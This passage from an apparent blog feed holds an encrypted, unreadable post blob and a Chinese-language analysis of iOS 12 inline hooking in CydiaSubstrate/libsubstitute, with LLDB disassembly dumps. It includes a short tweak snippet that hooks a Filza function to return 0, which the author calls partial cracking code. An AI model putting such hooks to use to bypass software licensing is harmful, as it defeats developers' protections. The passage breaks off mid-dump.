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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="wiki" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/wiki/"/>
    
    
      <category term="wiki" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/wiki/"/>
    
      <category term="windows" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>iOS12内存patch remap bug分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/16/iOS12-remap-bug-analyze/iOS12-remap-bug-analyze/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/16/iOS12-remap-bug-analyze/iOS12-remap-bug-analyze/</id>
    <published>2019-08-15T16:22:28.000Z</published>
    <updated>2019-08-20T07:18:00.086Z</updated>
    
    <content type="html"><![CDATA[<h3 id="iOS12内存patch-remap-bug分析"><a href="#iOS12内存patch-remap-bug分析" class="headerlink" title="iOS12内存patch remap bug分析"></a>iOS12内存patch remap bug分析</h3><blockquote><p>之前在做LLDB中的内存patch的时候提到在iOS12(包括iOS11)上面remap会出现bug的问题，一直相当困扰。其他hook框架都能在最新越狱上面正常patch，为什么我写的就不行？所以这篇文章准备一探究竟，但是在目前为止我也没有弄懂原因。不过这里会先分析最新系统上面两张hook框架对于inlinehook的原理及其相关细节。先看下他们的hook框架是如何实现内存patch和hook的。</p></blockquote><h4 id="iOS12-MSHookFunction分析-CoolStar越狱工具"><a href="#iOS12-MSHookFunction分析-CoolStar越狱工具" class="headerlink" title="iOS12 MSHookFunction分析(CoolStar越狱工具)"></a>iOS12 MSHookFunction分析(CoolStar越狱工具)</h4><p>在iOS12越狱上面<code>CydiaSubstrate</code>指向的是<code>libsubstrate.dylib</code></p><p><code>/Library/Frameworks/CydiaSubstrate.framework/CydiaSubstrate -&gt; ../../../usr/lib/libsubstrate.dylib</code></p><p>我们常用的<code>MSHookFunction</code>函数的实现就是在<code>libsubstrate.dylib</code>这里面，不过在这里仅仅是<code>SubHookFunction</code>的封装。而<code>SubHookFunction</code>的实现却是在<code>/usr/lib/libsubstitute.0.dylib</code>这里</p><p><code>/usr/lib/libsubstitute.0.dylib</code>是一个软连接指向<code>libsubstitute.dylib</code>。这里的<code>libsubstitute.dylib</code>就是coolstar维护的版本。下面分析<code>libsubstitute.dylib</code>的inlinehook实现细节。</p><p>下面是我写的一个tweak插件代码（<del>没错就是破解Filza的，不过只是部分代码</del>），hook了<code>_ZTL7624417887</code>函数。</p><pre><code class="c">static BOOL (*original_ZTL7624417887)(int a1, int a2, int a3); BOOL new_ZTL7624417887(int a1, int a2, int a3){    NSLog(@&quot;====xxxx===hook ZTL7624417887---&gt;%d&quot;, 0);    return 0;}%ctor{        MSImageRef  image =  MSGetImageByName(&quot;/Applications/Filza.app/Filza&quot;);    NSLog(@&quot;===xxx===image:%p&quot;, image);    void* ZTL7624417887 = (void*)MSFindSymbol(image, &quot;_ZTL7624417887&quot;);    NSLog(@&quot;===xxx===ZTL7624417887:%p&quot;, ZTL7624417887);    MSHookFunction((void*)ZTL7624417887, (void*)new_ZTL7624417887, (void**)&amp;original_ZTL7624417887);}</code></pre><p><strong>调试分析</strong></p><p>对<code>MSHookFunction</code>下断点，发现断在了我们预想的位置。</p><pre><code>CydiaSubstrate`MSHookFunction:-&gt;  0x10550fca0 &lt;+0&gt;:  cbz    x0, 0x10550fca8           ; &lt;+8&gt;    0x10550fca4 &lt;+4&gt;:  b      0x10550fe80               ; symbol stub for: SubHookFunction    0x10550fca8 &lt;+8&gt;:  ret</code></pre><pre><code>(lldb) re re General Purpose Registers:        x0 = 0x000000010489a068  Filza`ZTL7624417887        x1 = 0x00000001055bbbec  xkfilza.dylib`new_ZTL7624417887(int, int, int) at Tweak.xm:19        x2 = 0x00000001055bc148  xkfilza.dylib`original_ZTL7624417887</code></pre><pre><code>* frame #0: 0x000000010550fca0 CydiaSubstrate`MSHookFunction    frame #1: 0x00000001055bbcd0 xkfilza.dylib`_logosLocalCtor_9eb4d9ed(argc=1, argv=0x000000016b657b50, envp=0x000000016b657b60) at Tweak.xm:29    frame #2: 0x00000001055df56c dyld`ImageLoaderMachO::doModInitFunctions(ImageLoader::LinkContext const&amp;) + 424    frame #3: 0x00000001055df7ac dyld`ImageLoaderMachO::doInitialization(ImageLoader::LinkContext const&amp;) + 40</code></pre><p>X0就是hook的函数地址，X1为替换的函数地址，X2为保存的原函数地址。</p><p>先看一下这三个地址的数据，如下所见，此时<code>ZTL7624417887</code>还没有hook，所以前几个指令没有变化。</p><pre><code>// ZTL7624417887 函数指令(lldb) x/5i 0x000000010489a068    0x10489a068: 0xd2800008   mov    x8, #0x0    0x10489a06c: 0xf0003489   adrp   x9, 1683    0x10489a070: 0x911a4129   add    x9, x9, #0x690            ; =0x690     0x10489a074: 0xb868792a   ldr    w10, [x9, x8, lsl #2]    0x10489a078: 0x6b00015f   cmp    w10, w0// new_ZTL7624417887 函数指令(lldb) x/5i 0x00000001055bbbec    0x1055bbbec: 0xd503237f   pacibsp     0x1055bbbf0: 0xd100c3ff   sub    sp, sp, #0x30             ; =0x30     0x1055bbbf4: 0xa9027bfd   stp    x29, x30, [sp, #0x20]    0x1055bbbf8: 0x910083fd   add    x29, sp, #0x20            ; =0x20     0x1055bbbfc: 0xb81fc3a0   stur   w0, [x29, #-0x4]// original_ZTL7624417887 是一个函数指针(lldb) x/5g 0x00000001055bc1480x1055bc148: 0x0000000000000000 0x00000000000000000x1055bc158: 0x0000000000000000 0x00000000000000000x1055bc168: 0x0000000000000000</code></pre><p>这里是我们单步执行两次，使其执行hook函数。这次再观察一下这三个地址的数据</p><pre><code>// ZTL7624417887 函数指令(lldb) x/5i 0x000000010489a068    0x10489a068: 0xb0006911   adrp   x17, 3361    0x10489a06c: 0x912fb231   add    x17, x17, 